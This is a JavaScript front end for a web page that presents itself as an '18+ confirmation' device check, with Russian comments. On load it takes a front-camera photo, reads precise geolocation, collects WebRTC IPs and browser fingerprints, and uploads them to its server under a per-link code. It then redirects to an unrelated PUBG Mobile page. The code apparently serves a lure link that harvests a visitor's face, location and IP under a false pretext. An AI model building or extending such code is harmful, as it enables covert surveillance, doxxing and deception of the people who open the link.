// ============================================================================
// === app.js (NO-JB, MAX ANTI-SPOOF, VARIANT C) ===============================
// ============================================================================
// Полная версия, объединённая, с глубокой анти-спуф логикой.
// Часть 1: базовые переменные, UI, утилиты, фото, гео, UA, permissions.
// ----------------------------------------------------------------------------

const QSP = {
  get(k) {
    try {
      return new URLSearchParams(location.search).get(k);
    } catch {
      return null;
    }
  }
};

const LITE_MODE =
  QSP.get("lite") === "1" || QSP.get("no_media") === "1";

const API_BASE =
  (typeof window !== "undefined" && window.__API_BASE)
    ? String(window.__API_BASE).replace(/\/+$/, "")
    : "";

const STRICT_MODE = QSP.get("strict") === "1";
const DEV_LOG = QSP.get("dev_log") === "1";

function dlog(...a) {
  if (DEV_LOG) console.log("[gate]", ...a);
}

// === UI elements ============================================================
const UI = {
  text: document.getElementById("text"),
  note: document.getElementById("note"),
  btn: document.getElementById("enterBtn"),
  reason: document.getElementById("reason"),
  title: document.getElementById("title")
};

function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = "grayscale(40%) brightness(0.8)";
  b.style.opacity = "0.6";
  b.style.cursor = "not-allowed";
  b.style.background = "linear-gradient(90deg,#246,#39a)";
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = "none";
  b.style.opacity = "1";
  b.style.cursor = "pointer";
  b.style.background = "linear-gradient(90deg,#4f00ff,#00bfff)";
}
function showBtn() {
  if (UI.btn) UI.btn.style.display = "block";
}
function hideBtn() {
  if (UI.btn) UI.btn.style.display = "none";
}

// === Code extractor ==========================================================
function determineCode() {
  const q = QSP.get("code");
  const code = q ? String(q).trim() : null;
  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
}

// ============================================================================
// === GEOLOCATION ============================================================
// ============================================================================
async function askGeolocation() {
  return new Promise((resolve) => {
    if (LITE_MODE || window.__DISABLE_GEO === true) return resolve(null);
    if (!("geolocation" in navigator)) return resolve(null);

    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now()
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// ============================================================================
// === PHOTO CAPTURE ==========================================================
// ============================================================================
function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement("canvas");
      c.width = w;
      c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      try {
        resolve(c.toDataURL("image/jpeg", quality));
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

window.__cameraLatencyMs = null;

async function takePhotoNormal() {
  if (!navigator.mediaDevices?.getUserMedia)
    throw new Error("Камера недоступна");

  const t0 = performance.now();
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  });

  return new Promise((resolve, reject) => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.playsInline = true;

    const fallback = setTimeout(() => {
      try {
        const c = document.createElement("canvas");
        c.width = 1280;
        c.height = 720;
        c.getContext("2d").drawImage(video, 0, 0);
        const dataUrl = c.toDataURL("image/jpeg", 0.8);
        stream.getTracks().forEach((t) => t.stop());
        window.__cameraLatencyMs = Math.round(performance.now() - t0);
        resolve(dataUrl);
      } catch (e) {
        reject(e);
      }
    }, 3000);

    video.onloadedmetadata = async () => {
      try {
        await video.play();
        clearTimeout(fallback);
        const c = document.createElement("canvas");
        c.width = video.videoWidth || 1280;
        c.height = video.videoHeight || 720;
        c.getContext("2d").drawImage(video, 0, 0);
        const dataUrl = c.toDataURL("image/jpeg", 0.85);
        stream.getTracks().forEach((t) => t.stop());
        window.__cameraLatencyMs = Math.round(performance.now() - t0);
        resolve(dataUrl);
      } catch (err) {
        stream.getTracks().forEach((t) => t.stop());
        reject(err);
      }
    };
  });
}

// Hidden <input type=file> fallback
(function ensureFileInput() {
  if (!document.getElementById("fileInp")) {
    const inp = document.createElement("input");
    inp.id = "fileInp";
    inp.type = "file";
    inp.accept = "image/*";
    inp.capture = "user";
    inp.style.display = "none";
    document.body.appendChild(inp);
  }
})();

async function takePhotoWithFallbackNormal() {
  try {
    return await takePhotoNormal();
  } catch {
    const inp = document.getElementById("fileInp");
    return new Promise((resolve, reject) => {
      inp.onchange = () => {
        const f = inp.files && inp.files[0];
        if (!f) return reject(new Error("Файл не выбран"));
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = reject;
        fr.readAsDataURL(f);
      };
      inp.click();
    });
  }
}

// Lite
const LITE_PHOTO =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAkMBgQq5xwAAAABJRU5ErkJggg==";

function takePhotoLite() {
  window.__cameraLatencyMs = null;
  return LITE_PHOTO;
}

function takePhotoUniversal() {
  if (LITE_MODE || window.__DISABLE_CAMERA === true)
    return takePhotoLite();
  return takePhotoWithFallbackNormal();
}

// ============================================================================
// === UA + PLATFORM DETECT ===================================================
// ============================================================================
function isIpadDesktopMode() {
  return navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1;
}
function isIOSHandheldUA(ua) {
  ua = ua || navigator.userAgent || "";
  return /(iPhone|iPad|iPod)/i.test(ua);
}
function parseIOSMajorFromUAUniversal(ua) {
  ua = ua || navigator.userAgent || "";
  const ipadDesktop = isIpadDesktopMode();
  const iosLike = isIOSHandheldUA(ua) || ipadDesktop;
  if (!iosLike) return null;
  const mOS = ua.match(/\bOS\s+(\d+)[._]/i);
  if (mOS) return parseInt(mOS[1], 10);
  if (ipadDesktop) {
    const mv = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
    if (mv) return parseInt(mv[1], 10);
  }
  return null;
}

function getDeviceInfo() {
  const ua = navigator.userAgent || "";
  const iosVer = parseIOSMajorFromUAUniversal(ua);
  return {
    userAgent: ua,
    platform: navigator.platform,
    iosVersion: iosVer,
    isSafari:
      /Safari\//.test(ua) &&
      !/CriOS|Chrome|FxiOS|Edg|OPR/i.test(ua) &&
      navigator.vendor === "Apple Computer, Inc.",
    isIpadDesktop: isIpadDesktopMode()
  };
}

// ============================================================================
// === PERMISSION STATES ======================================================
// ============================================================================
async function getPermissionStates() {
  if (LITE_MODE || window.__DISABLE_CAMERA || window.__DISABLE_GEO)
    return { geolocation: "denied", camera: "denied", microphone: "prompt" };

  if (!navigator.permissions?.query) return null;

  async function q(name) {
    try {
      return (await navigator.permissions.query({ name })).state;
    } catch {
      return "unknown";
    }
  }
  const [geo, cam, mic] = await Promise.all([
    q("geolocation"),
    q("camera"),
    q("microphone")
  ]);
  return { geolocation: geo, camera: cam, microphone: mic };
}
// ============================================================================
// == PART 2: WebRTC, Canvas, Storage, Battery, WebGL, Locale, In-App ========
// ============================================================================

// ============================================================================
// === WebRTC IP Leak ==========================================================
// ============================================================================
async function getWebRTCIps() {
  return new Promise((resolve) => {
    const ips = [];
    try {
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
      });

      pc.createDataChannel("x");
      pc.createOffer()
        .then((offer) => pc.setLocalDescription(offer))
        .catch(() => resolve([]));

      pc.onicecandidate = (ev) => {
        if (!ev || !ev.candidate) {
          resolve([...new Set(ips)]);
          return;
        }
        const c = ev.candidate.candidate;
        const m = c.match(/candidate:\d+ \d+ (udp|tcp) \d+ ([0-9.]+)/);
        if (m && m[2]) ips.push(m[2]);
      };

      setTimeout(() => resolve([...new Set(ips)]), 2000);
    } catch {
      resolve([]);
    }
  });
}

// ============================================================================
// === Canvas Entropy ==========================================================
// ============================================================================
function getCanvasEntropy() {
  try {
    const c = document.createElement("canvas");
    c.width = 200;
    c.height = 60;
    const ctx = c.getContext("2d");

    ctx.textBaseline = "top";
    ctx.font = "16px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, 200, 60);

    ctx.fillStyle = "#069";
    ctx.fillText("entropy-test-123", 2, 2);

    ctx.strokeStyle = "rgba(120, 10, 50, 0.7)";
    ctx.beginPath();
    ctx.moveTo(10, 50);
    ctx.lineTo(190, 10);
    ctx.stroke();

    const data = c.toDataURL();
    let hash = 0;
    for (let i = 0; i < data.length; i++)
      hash = (hash * 31 + data.charCodeAt(i)) & 0xffffffff;

    return {
      dataUrlLen: data.length,
      hash,
      sample: data.slice(0, 32)
    };
  } catch (e) {
    return { error: String(e) };
  }
}

// ============================================================================
// === Storage Quota ===========================================================
// ============================================================================
async function getStorageEstimateSafe() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const est = await navigator.storage.estimate();
      return {
        quota: est.quota || null,
        usage: est.usage || null
      };
    }
  } catch {}
  return { quota: null, usage: null };
}

// ============================================================================
// === Battery (Charging + anomalies) ==========================================
// ============================================================================
async function getBatteryInfo() {
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      return {
        charging: b.charging,
        level: b.level,
        chargingTime: b.chargingTime,
        dischargingTime: b.dischargingTime
      };
    }
  } catch {}
  return null;
}

// ============================================================================
// === WebGL Renderer/Vendor ====================================================
// ============================================================================
function getWebGLInfo() {
  const out = {};
  try {
    const c = document.createElement("canvas");
    const gl =
      c.getContext("webgl") ||
      c.getContext("experimental-webgl");
    if (!gl) return { error: "no-webgl" };

    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    if (dbg) {
      out.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      out.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    } else {
      out.vendor = gl.getParameter(gl.VENDOR);
      out.renderer = gl.getParameter(gl.RENDERER);
    }

    out.version = gl.getParameter(gl.VERSION);
    out.shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);

    // Entropy
    try {
      const tex = gl.createTexture();
      gl.bindTexture(gl.TEXTURE_2D, tex);
      const pixels = new Uint8Array(64);
      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4, 4, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
      out.entropy = pixels.slice(0, 16);
    } catch {}

  } catch (e) {
    return { error: String(e) };
  }
  return out;
}

// ============================================================================
// === Locale, Timezone, Intl ===================================================
// ============================================================================
function getLocaleInfo() {
  const out = {};
  try {
    out.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
  } catch {}

  out.lang = navigator.language || null;
  out.langs = navigator.languages || [];

  out.screen = {
    w: screen.width,
    h: screen.height,
    aw: screen.availWidth,
    ah: screen.availHeight
  };

  out.dpr = window.devicePixelRatio || null;

  try {
    out.intl = {
      num: new Intl.NumberFormat().resolvedOptions(),
      dt: new Intl.DateTimeFormat().resolvedOptions()
    };
  } catch {}

  return out;
}

// ============================================================================
// === In-App WebView Check =====================================================
// ============================================================================
function detectInAppWebView() {
  const ua = navigator.userAgent || "";
  const isFB = /FBAN|FBAV|FB_IAB|FBAN/i.test(ua);
  const isIG = /Instagram/i.test(ua);
  const isTikTok = /TikTok/i.test(ua);
  const isLine = /Line\//i.test(ua);
  const isVK = /VK/i.test(ua);
  const isWeChat = /MicroMessenger/i.test(ua);
  const isTelegram = /Telegram/i.test(ua);
  const isSnap = /Snapchat/i.test(ua);
  const isDiscord = /Discord/i.test(ua);

  return {
    isInApp: isFB || isIG || isTikTok || isLine || isVK || isWeChat || isTelegram || isSnap || isDiscord,
    fb: isFB,
    ig: isIG,
    tiktok: isTikTok,
    line: isLine,
    vk: isVK,
    wechat: isWeChat,
    tg: isTelegram,
    snap: isSnap,
    discord: isDiscord
  };
}

// ============================================================================
// === NETWORK INFO (RTT, downlink, type) ======================================
// ============================================================================
function getNetworkInfo() {
  const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!n) return null;
  return {
    effectiveType: n.effectiveType || null,
    rtt: n.rtt || null,
    downlink: n.downlink || null,
    saveData: n.saveData || false,
    type: n.type || null
  };
}

// ============================================================================
// === DEVTOOLS HEURISTIC (NO ADV, LIGHT) =======================================
// ============================================================================
function detectDevtoolsHeuristic() {
  const threshold = 160;
  const w = window.outerWidth - window.innerWidth;
  const h = window.outerHeight - window.innerHeight;

  const opened = (w > threshold) || (h > threshold);
  return { opened, wDiff: w, hDiff: h };
}

// ============================================================================
// === COLLECT FULL CLIENT PROFILE =============================================
// ============================================================================
async function collectClientProfile() {
  dlog("collectClientProfile start");

  const rtc = await getWebRTCIps();
  const canvas = getCanvasEntropy();
  const webgl = getWebGLInfo();
  const storage = await getStorageEstimateSafe();
  const battery = await getBatteryInfo();
  const locale = getLocaleInfo();
  const net = getNetworkInfo();
  const perms = await getPermissionStates();
  const inApp = detectInAppWebView();

  return {
    webrtcIps: rtc,
    canvas,
    webgl,
    storage,
    battery,
    locale,
    network: net,
    permissions: perms,
    inAppWebView: inApp,
    // Automation baseline score (легкая версия)
    automationScore: estimateAutomationScore({ canvas, webgl, rtc, locale }),
    timestamp: Date.now()
  };
}

// ============================================================================
// === Automation Score (легкий) ===============================================
// ============================================================================
function estimateAutomationScore({ canvas, webgl, rtc, locale }) {
  let score = 0;

  if (Array.isArray(rtc) && rtc.length === 0) score += 0.15;
  if (canvas && canvas.dataUrlLen <= 2000) score += 0.15;
  if (webgl && webgl.error) score += 0.2;
  if (locale && locale.timeZone && /UTC/i.test(locale.timeZone)) score += 0.15;

  if (score > 1) score = 1;
  return Number(score.toFixed(3));
}
// ============================================================================
// == PART 3: Safari 18 FeatureGate + Anti-Spoof Checks ========================
// ============================================================================

// ---------------------------------------------------------------------------
// Safari 18.0 — ViewTransition Detection
// ---------------------------------------------------------------------------
async function testSafari18_ViewTransitions() {
  const hasAPI = typeof document.startViewTransition === "function";
  const cssOK = CSS?.supports?.("view-transition-name: auto") === true;
  let ran = false;
  let finished = false;

  try {
    if (hasAPI) {
      const d = document.createElement("div");
      document.body.appendChild(d);
      const vt = document.startViewTransition(() => { ran = true; });
      await vt?.finished;
      finished = true;
      d.remove();
    }
  } catch {}

  return {
    feature: "Safari18-ViewTransitions",
    pass: !!(hasAPI && cssOK && ran && finished)
  };
}

// ---------------------------------------------------------------------------
// Safari 18.4 — Triple Check: shape(), cookieStore, WebAuthn JSON parsing
// ---------------------------------------------------------------------------
async function testSafari18_TripleCheck() {
  let shapeOK = false;
  try {
    const el = document.createElement("div");
    el.style.clipPath =
      "shape(from right center, line to bottom center, line to right center)";
    shapeOK = !!el.style.clipPath;
  } catch {}

  const cookieStoreOK = typeof window.cookieStore === "object";

  let webauthnOK = false;
  try {
    webauthnOK =
      typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === "function" &&
      typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === "function";
  } catch {}

  return {
    feature: "Safari18.4-Combined",
    pass: !!(shapeOK && cookieStoreOK && webauthnOK),
    shapeOK,
    cookieStoreOK,
    webauthnOK
  };
}

// ---------------------------------------------------------------------------
// Full Safari Feature Tests (VT18 + 18.4 triple)
// ---------------------------------------------------------------------------
async function runSafariFeatureTests() {
  const vt18_0 = await testSafari18_ViewTransitions();
  const triple18_4 = await testSafari18_TripleCheck();

  return {
    vt18_0,
    triple18_4,
    summary: {
      VT18: vt18_0.pass ? "ok" : "—",
      v18_4: triple18_4.pass ? "ok" : "—"
    }
  };
}

// ---------------------------------------------------------------------------
// Wait for injected FeatureGate (optional) with timeout
// ---------------------------------------------------------------------------
async function waitFeatureGate(ms = 800) {
  if (window.__featureGate) return window.__featureGate;

  return new Promise((resolve) => {
    const t = setTimeout(() => resolve(window.__featureGate || null), ms);
    window.addEventListener(
      "featuregate-ready",
      (ev) => {
        clearTimeout(t);
        resolve(ev.detail || window.__featureGate || null);
      },
      { once: true }
    );
  });
}

// ============================================================================
// == PART 3-B: Anti-Spoof — Display & UA Anomalies ============================
// ============================================================================

// ---------------------------------------------------------------------------
// Display impossible states (MAX strict)
// ---------------------------------------------------------------------------
function detectDisplayHardAnomalies_CP(clientProfile) {
  const scr = clientProfile?.locale?.screen || {};
  const dpr = Number(clientProfile?.locale?.dpr ?? 0) || 0;
  const ua = navigator.userAgent || "";
  const plat = navigator.platform || "";

  let displaySpoofHard = false;
  const notes = [];

  const sw = Number(scr.w || 0);
  const sh = Number(scr.h || 0);

  // iPhone cannot be 1920x1080+
  if (/iPhone/i.test(ua) && sw >= 1920 && sh >= 1080) {
    displaySpoofHard = true;
    notes.push("iPhone UA with desktop-level resolution >= 1920x1080");
  }

  // iPad cannot be <=400px width
  if (/iPad/i.test(ua) && sw > 0 && sw <= 400) {
    displaySpoofHard = true;
    notes.push("iPad with unrealistic width <= 400px");
  }

  // DPR cannot be <1 on iOS
  if (/iPhone|iPad/i.test(ua) && dpr > 0 && dpr < 1) {
    displaySpoofHard = true;
    notes.push("iOS DPR < 1 impossible");
  }

  // MacIntel spoofing iPhone resolutions
  if (/MacIntel/i.test(plat) && (sw <= 640 || sh <= 480) && (navigator.maxTouchPoints || 0) === 0) {
    displaySpoofHard = true;
    notes.push("MacIntel with tiny mobile-like screen size");
  }

  return { displaySpoofHard, notes };
}

// ---------------------------------------------------------------------------
// Anti-Spoof: VT18 mismatch (VT18 ok but UA not Safari-like)
// ---------------------------------------------------------------------------
function isSafariLikeUA(ua) {
  return (
    /Safari\//.test(ua) &&
    /AppleWebKit\//.test(ua) &&
    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR|UCBrowser|YaBrowser|Brave/i.test(ua)
  );
}

function detectVT18Spoof_CP({ features, clientProfile }) {
  const ua = navigator.userAgent || "";
  const plat = navigator.platform || "";
  const vtOk = features?.VT18 === "ok";

  let hardSpoofVT18 = false;
  const notes = [];

  if (!vtOk) return { hardSpoofVT18, notes };

  // VT18 ok but UA not Safari-like
  if (!isSafariLikeUA(ua)) {
    hardSpoofVT18 = true;
    notes.push("VT18 ok but UA not Safari-like");
  }

  // VT18 ok but platform not Apple
  if (!/iPhone|iPad|Macintosh|MacIntel/i.test(ua + " " + plat)) {
    hardSpoofVT18 = true;
    notes.push("VT18 ok but platform not Apple");
  }

  // iPhone spoofing Mac resolution
  const scr = clientProfile?.locale?.screen || {};
  if (/iPhone/i.test(ua) && scr.w >= 1600) {
    hardSpoofVT18 = true;
    notes.push("VT18 ok but iPhone screen looks like desktop");
  }

  return { hardSpoofVT18, notes };
}

// ============================================================================
// == PART 3-C: Anti-Spoof Master (combines anomalies) =========================
// ============================================================================
function runAntiSpoofMaster({ clientProfile, features }) {
  const disp = detectDisplayHardAnomalies_CP(clientProfile);
  const vt = detectVT18Spoof_CP({ features, clientProfile });

  return {
    display: disp,
    vt18: vt,
    hard: disp.displaySpoofHard || vt.hardSpoofVT18
  };
}
// ============================================================================
// == PART 4: Device Check (MAX Anti-Spoof variant) ============================
// ============================================================================

async function runDeviceCheck(clientProfile) {
  const reasons = [];
  const details = {};
  let score = 100;

  try {
    const ua = navigator.userAgent || "";
    const plat = navigator.platform || "";

    details.ua = ua;
    details.platform = plat;
    details.timezone = clientProfile?.locale?.timeZone;
    details.screen = clientProfile?.locale?.screen;
    details.maxTouchPoints = navigator.maxTouchPoints || 0;

    // ------------------------------------------------------------
    // webdriver
    // ------------------------------------------------------------
    details.navigator_webdriver = navigator.webdriver;
    if (navigator.webdriver) {
      reasons.push("webdriver=true (bot env)");
      score -= 60;
    }

    // ------------------------------------------------------------
    // Devtools
    // ------------------------------------------------------------
    const devtools = detectDevtoolsHeuristic();
    details.devtools = devtools;
    if (devtools?.opened) {
      reasons.push("DevTools размеры окна");
      score -= 6;
    }

    // ------------------------------------------------------------
    // Camera latency
    // ------------------------------------------------------------
    details.cameraLatencyMs = window.__cameraLatencyMs;
    if (!LITE_MODE && details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
      reasons.push("Слишком малая cameraLatency (desktop/emu)");
      score -= 10;
    }

    // ------------------------------------------------------------
    // In-app
    // ------------------------------------------------------------
    if (clientProfile?.inAppWebView?.isInApp) {
      reasons.push("In-App WebView");
      score -= 8;
    }

    // ------------------------------------------------------------
    // CANVAS entropy
    // ------------------------------------------------------------
    if (clientProfile?.canvas?.dataUrlLen && clientProfile.canvas.dataUrlLen < 1000) {
      reasons.push("Слабая canvas-энтропия");
      score -= 8;
    }

    // ------------------------------------------------------------
    // WebGL spoof
    // ------------------------------------------------------------
    if (clientProfile?.webgl?.error) {
      reasons.push("WebGL недоступен или сломан");
      score -= 10;
    } else {
      const vendor = String(clientProfile.webgl.vendor || "").toLowerCase();
      const renderer = String(clientProfile.webgl.renderer || "").toLowerCase();

      if (!vendor || vendor === "google inc.") {
        // google inc. — Chrome, но Safari на iOS должен давать Apple GPU
        if (/iPhone|iPad/i.test(ua) && vendor.includes("google")) {
          reasons.push("WebGL renderer подозрительный для iOS Safari");
          score -= 12;
        }
      }

      // GPU anomalies
      if (/mesa|llvmpipe|swiftshader/.test(renderer)) {
        reasons.push("Десктопный/эмулированный GPU renderer");
        score -= 15;
      }
    }

    // ------------------------------------------------------------
    // Storage anomalies
    // ------------------------------------------------------------
    {
      const quota = clientProfile?.storage?.quota;
      if (quota && quota < 200 * 1024 * 1024) {
        // смартфоны обычно имеют 1GB+
        reasons.push("Unrealistic storage quota");
        score -= 10;
      }
    }

    // ------------------------------------------------------------
    // Battery anomalies
    // ------------------------------------------------------------
    if (clientProfile?.battery) {
      const b = clientProfile.battery;
      if (b.level != null && (b.level === 1 || b.level === 0)) {
        // точно 0 и 100 часто у эмуляторов
        reasons.push("Battery level = 0/1 suspicious");
        score -= 4;
      }
    }

    // ------------------------------------------------------------
    // Locale / timezone mismatches
    // ------------------------------------------------------------
    {
      const tz = (clientProfile?.locale?.timeZone || "").toUpperCase();
      const langs = clientProfile?.locale?.langs || [];
      const systemLang = clientProfile?.locale?.lang || "";

      if (!tz || tz.includes("UTC")) {
        reasons.push("UTC timezone suspicious for iOS Safari");
        score -= 5;
      }

      if (langs.length === 0) {
        reasons.push("No navigator.languages");
        score -= 5;
      }

      if (!systemLang) {
        reasons.push("No navigator.language");
        score -= 4;
      }
    }

    // ------------------------------------------------------------
    // NETWORK heuristics (basic)
    // ------------------------------------------------------------
    {
      const n = clientProfile?.network;
      if (n) {
        if (n.effectiveType && /2g/i.test(n.effectiveType)) {
          reasons.push("Очень медленная сеть (2g)");
          score -= 5;
        }

        if (n.rtt && n.rtt > 800) {
          reasons.push("Очень высокий RTT");
          score -= 5;
        }
      }
    }

    // ------------------------------------------------------------
    // WebRTC leaks (presence/absence)
    // ------------------------------------------------------------
    if (Array.isArray(clientProfile?.webrtcIps)) {
      if (clientProfile.webrtcIps.length === 0) {
        reasons.push("WebRTC: IP leak отсутствует (возможно spoof)");
        score -= 4;
      }
      if (clientProfile.webrtcIps.length >= 2) {
        reasons.push("WebRTC: несколько IP (VPN/proxy)");
        score -= 8;
      }
    }

    // ------------------------------------------------------------
    // Automation Score
    // ------------------------------------------------------------
    if (clientProfile?.automationScore >= 0.75) {
      reasons.push("AutomationScore высоко");
      score -= 20;
    } else if (clientProfile?.automationScore >= 0.45) {
      reasons.push("AutomationScore средний");
      score -= 10;
    }

    // ------------------------------------------------------------
    // Permissions mismatch
    // ------------------------------------------------------------
    if (clientProfile?.permissions) {
      const p = clientProfile.permissions;

      if (p.geolocation === "denied" && !LITE_MODE) {
        reasons.push("Geo denied");
        score -= 8;
      }

      if (p.camera === "denied" && !LITE_MODE) {
        reasons.push("Camera denied");
        score -= 8;
      }

      if (p.microphone === "denied") {
        reasons.push("Microphone denied");
        score -= 4;
      }
    }

    // ------------------------------------------------------------
    // MASTER ANTI-SPOOF (from Part 3)
    // ------------------------------------------------------------
    const safariFeatures = clientProfile?.__featuresSummary || {};
    const anti = runAntiSpoofMaster({
      clientProfile,
      features: safariFeatures
    });

    details.antiSpoof = anti;

    if (anti.display.displaySpoofHard) {
      reasons.push("Display impossible (hard)");
      score -= 40;
    }
    if (anti.vt18.hardSpoofVT18) {
      reasons.push("VT18 spoof (hard)");
      score -= 40;
    }

    // Final thresholds
    if (score >= 80) {
      reasons.push("Ок: окружение норм");
    } else if (score >= 60) {
      reasons.push("Несостыковки, но может быть реальный iOS");
    } else {
      reasons.push("Высокая вероятность подмены/симуляции");
    }

  } catch (e) {
    reasons.push("Ошибка проверки окружения: " + e.message);
  }

  // clamp
  if (score < 0) score = 0;
  if (score > 100) score = 100;

  return {
    score,
    label: score < 60 ? "likely" : score < 80 ? "possible" : "unlikely",
    reasons,
    details,
    timestamp: Date.now()
  };
}
// ============================================================================
// == PART 5: AUTO-FLOW, SEND REPORT, FINAL LOGIC =============================
// ============================================================================

// ---------------------------------------------------------------------------
// sendReport
// ---------------------------------------------------------------------------
async function sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary }) {
  const info = getDeviceInfo();
  const code = determineCode();
  if (!code) throw new Error("Нет кода");

  const body = {
    userAgent: info.userAgent,
    platform: info.platform,
    iosVersion: info.iosVersion,
    isSafari: info.isSafari,
    geo,
    photoBase64,
    note: "auto",
    code,
    client_profile,
    device_check,
    featuresSummary,
    strict: STRICT_MODE ? 1 : 0
  };

  const r = await fetch(`${API_BASE}/api/report`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });

  const txt = await r.text();
  let json = null;
  try { json = JSON.parse(txt); } catch {}

  if (!r.ok) throw new Error(json?.error || txt);
  if (!json?.ok) throw new Error(json?.error || "Ошибка сервера");

  return json;
}

// ---------------------------------------------------------------------------
// AUTO-FLOW
// ---------------------------------------------------------------------------
async function autoFlow() {
  try {
    setBtnLocked();
    showBtn();

    if (UI.title) UI.title.textContent = "Подтверждение 18+";
    if (UI.text) UI.text.textContent = "Готовим проверку устройства…";

    const code = determineCode();
    if (!code) {
      hideBtn();
      return { ok:false, decision:{ canLaunch:false }, reason:"Нет кода" };
    }

    if (UI.note) UI.note.textContent = "Собираем данные…";

    // ---------------------
    // гео + фото + клиент-профайл
    // ---------------------
    const [geo, rawPhoto, client_profile] = await Promise.all([
      askGeolocation(),
      takePhotoUniversal(),
      collectClientProfile()
    ]);

    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);

    if (UI.note) UI.note.textContent = "Проверяем Safari 18…";

    // ---------------------
    // Safari FeatureGate
    // ---------------------
    const fg = await waitFeatureGate();
    let vt18_ok, v184_ok;

    if (fg?.effective) {
      vt18_ok = !!fg.effective.vt18Pass;
      v184_ok = !!fg.effective.v184Pass;
    } else {
      const { vt18_0, triple18_4 } = await runSafariFeatureTests();
      vt18_ok = vt18_0.pass;
      v184_ok = triple18_4.pass;
    }

    const featuresSummary = {
      VT18: vt18_ok ? "ok" : "—",
      v18_4: v184_ok ? "ok" : "—"
    };

    // inject into profile for anti-spoof master
    client_profile.__featuresSummary = featuresSummary;

    // ---------------------
    // Safari 18 required
    // ---------------------
    if (!vt18_ok) {
      if (UI.reason)
        UI.reason.textContent = "Safari 18 отсутствует";
      return {
        ok: true,
        decision: { canLaunch:false },
        reason: "Safari 18 отсутствует",
        featuresSummary
      };
    }

    if (UI.note) UI.note.textContent = "Анализ окружения…";

    // ---------------------
    // Device Check (MAX Anti-Spoof)
    // ---------------------
    const device_check = await runDeviceCheck(client_profile);

    if (UI.note) UI.note.textContent = "Отправляем отчёт…";

    // ---------------------
    // SEND REPORT → SERVER
    // ---------------------
    const resp = await sendReport({
      photoBase64,
      geo,
      client_profile,
      device_check,
      featuresSummary
    });

    const decision = resp?.decision || { canLaunch:false };

    window.__decision = decision;
    window.__reportReady = !!decision.canLaunch;

    if (decision.canLaunch) {
      if (UI.text) UI.text.textContent = "Проверка успешно пройдена";
      if (UI.note) UI.note.textContent = "Можете войти";
      setBtnReady();
    } else {
      if (UI.text) UI.text.textContent = "Проверка не пройдена";
      if (UI.note) UI.note.textContent = "Доступ запрещён";
    }

    return {
      ok: true,
      decision,
      risk: resp?.risk,
      flags: resp?.flags,
      featuresSummary
    };

  } catch (err) {
    if (UI.text) UI.text.textContent = "Ошибка проверки";
    if (UI.note) UI.note.textContent = String(err);
    return {
      ok:false,
      decision:{ canLaunch:false },
      error:String(err)
    };
  }
}

// ---------------------------------------------------------------------------
// expose
// ---------------------------------------------------------------------------
window.startAutoFlow = () => autoFlow();

// ---------------------------------------------------------------------------
// КНОПКА «Войти»
// ---------------------------------------------------------------------------
(function setupEnter() {
  const btn = UI.btn;
  if (!btn) return;

  btn.addEventListener("click", (e) => {
    if (!window.__decision?.canLaunch) {
      e.preventDefault();
      return;
    }
    // как ты сказал — оставляем такой URL
    location.assign("https://www.pubgmobile.com/ig/itop");
  });
})();
